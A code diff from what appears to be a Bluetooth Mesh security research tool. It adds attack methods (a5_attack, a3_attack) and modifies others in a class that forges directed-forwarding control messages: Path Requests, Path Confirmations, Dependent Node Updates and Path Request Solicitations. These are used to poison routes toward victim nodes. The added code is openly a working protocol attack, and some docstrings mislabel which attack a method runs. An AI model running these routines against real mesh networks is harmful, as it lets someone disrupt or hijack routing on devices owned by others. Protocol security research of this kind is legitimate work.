@@ -71,6 +71,44 @@ class UpperTransportDFAttacks(UpperTransportLayer):
         self.remove(AccessLayer)
         self.add(DFAttacksAccessLayer)
 
+    def a5_attack(self, victim_addr):
+        """
+        Launched the A5 attack.
+        Sends a Path Request to the victim. Expects a Path Reply with confirmation.
+        We then send the PAth Conformation, and finally send a dependent_nodes_update message.
+
+        :param victim_addr: Addr of the victim
+        :type victim_addr: int
+        """
+
+        pkt = BTMesh_Upper_Transport_Control_Path_Request(
+            on_behalf_of_dependent_origin=0,
+            path_origin_path_metric_type=0,
+            path_discovery_interval=0,
+            path_origin_path_lifetime=0,
+            path_origin_path_metric=0,
+            destination=victim_addr,
+            path_origin_unicast_addr_range=UnicastAddr(
+                range_start=self.state.profile.primary_element_addr & 0x7FFF
+            ),
+        )
+
+        ctx = MeshMessageContext()
+        ctx.creds = DIRECTED_FORWARDING_CREDS
+        ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
+        ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
+        ctx.ttl = 0
+        ctx.is_ctl = True
+        ctx.net_key_id = 0
+        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
+            pkt.path_origin_forwarding_number
+        )
+        self.path_requests_processed[key] = (pkt, ctx)
+
+        self.send_control_message((
+            pkt,
+            ctx,
+        ))
 
     def on_path_request_react(self, message):
         """
@@ -89,12 +127,17 @@ class UpperTransportDFAttacks(UpperTransportLayer):
         if key in self.path_requests_processed.keys():
             return
 
+        pkt.show()
         self.path_requests_processed[key] = message
-        if pkt.destination == 0x7FE1:
-            self.a2_path_request_react(message)
+        if pkt.destination == 0x7E00:
+            self.a3_path_request_react(message)
 
         if self.state.profile.is_unicast_addr_ours(pkt.destination):
             self.classic_path_request_react(message)
+            """
+        else:
+            self.a2_path_request_react(message)
+            """
 
     def a3_path_request_react(self, message):
         """
@@ -111,12 +154,12 @@ class UpperTransportDFAttacks(UpperTransportLayer):
             path_origin=pkt.path_origin_unicast_addr_range.range_start,
             path_origin_forwarding_number=pkt.path_origin_forwarding_number,
             path_target_unicast_addr_range=UnicastAddr(
-                length_present=1, range_start=0x0100 & 0x7FFF, range_length=0xFF
+                length_present=1, range_start=0x0001 & 0x7FFF, range_length=0xFF
             ),
             dependent_target_unicast_addr_range=UnicastAddr(
                 length_present=1,
                 range_length=0xFF,
-                range_start=0x0001 & 0x7FFF,
+                range_start=0x7E00 & 0x7FFF,
             ),
         )
         resp_ctx = copy(ctx)
@@ -124,7 +167,7 @@ class UpperTransportDFAttacks(UpperTransportLayer):
         resp_ctx.dest_addr = ctx.src_addr
         resp_ctx.creds = DIRECTED_FORWARDING_CREDS
         timer = Timer(
-            1,
+            0.5,
             self.send_control_message,
             args=[(resp_pkt, resp_ctx)],
         )
@@ -136,6 +179,7 @@ class UpperTransportDFAttacks(UpperTransportLayer):
             resp_pkt.path_target_unicast_addr_range.range_start
         )
         self.path_echo_reply_list[key] = (1, MANAGED_FLOODING_CREDS)
+        """
         echo_reply_timer = Thread(
             3,
             self.path_echo_reply_send,
@@ -145,6 +189,7 @@ class UpperTransportDFAttacks(UpperTransportLayer):
             ],
         )
         echo_reply_timer.start()
+        """
 
     def classic_path_request_react(self, message):
         """
@@ -298,7 +343,7 @@ class UpperTransportDFAttacks(UpperTransportLayer):
             )
             return
 
-        # Send Path Confirmation if Path Reply for our address
+        # Send Path Confirmation if Path Reply for our address. For A5 attack, send a dependent_nodes_update afterwards
         if self.state.profile.is_unicast_addr_ours(pkt.path_origin):
             if pkt.confirmation_request == 1:
                 resp_pkt = BTMesh_Upper_Transport_Control_Path_Confirmation(
@@ -310,22 +355,30 @@ class UpperTransportDFAttacks(UpperTransportLayer):
                 resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(
                     2, "big"
                 )
-                resp_ctx.dest_addr = (
-                    pkt.path_target_unicast_addr_range.range_start.to_bytes(2, "big")
-                )
+                resp_ctx.dest_addr = b"\xff\xfb"
                 resp_ctx.ttl = 0
                 resp_ctx.is_ctl = True
                 resp_ctx.net_key_id = 0
-                self.send_control_message((
-                    resp_pkt,
-                    resp_ctx,
-                ))
+                timer = Timer(1, self.send_control_message, args=[(resp_pkt, resp_ctx)])
+                timer.start()
 
                 # update credentials for echo reply
-                key = str(pkt.path_origin) + str(pkt.path_target)
+                key = str(pkt.path_origin) + str(
+                    pkt.path_target_unicast_addr_range.range_start
+                )
                 self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)
 
-                return
+                dep_pkt = BTMesh_Upper_Transport_Control_Dependent_Node_Update(
+                    type=1,
+                    path_endpoint=pkt.path_origin,
+                    dependent_node_unicast_addr_range=UnicastAddr(
+                        range_start=0x0001, length_present=1, range_length=0xFF
+                    ),
+                )
+
+                dep_ctx = copy(resp_ctx)
+                thread = Timer(3, self.send_control_message, args=[(dep_pkt, dep_ctx)])
+                thread.start()
 
     def discover_topology_thread(self, addr_low, addr_high):
         """
@@ -366,3 +419,29 @@ class UpperTransportDFAttacks(UpperTransportLayer):
     def get_network_topology(self):
         return self.topology
 
+    def a3_attack(self, addr_list):
+        """
+        Lauches the a2 attack (path_request_solicitation)
+        The list of addresses is the list to put in the Path Request Soliciation message.
+        The unused address for the malicious path is always
+
+        :param addr_list: List of addr to put in the Path Solicitation message
+        :type addr_list: List[int]
+        """
+        addr_list.insert(0, 0x7E00)
+        pkt = BTMesh_Upper_Transport_Control_Path_Request_Solicitation(
+            addr_list=addr_list
+        )
+        pkt.show()
+        ctx = MeshMessageContext()
+        ctx.creds = DIRECTED_FORWARDING_CREDS
+        ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
+        ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
+        ctx.ttl = 0x7F
+        ctx.is_ctl = True
+        ctx.net_key_id = 0
+
+        self.send_control_message((
+            pkt,
+            ctx,
+        ))
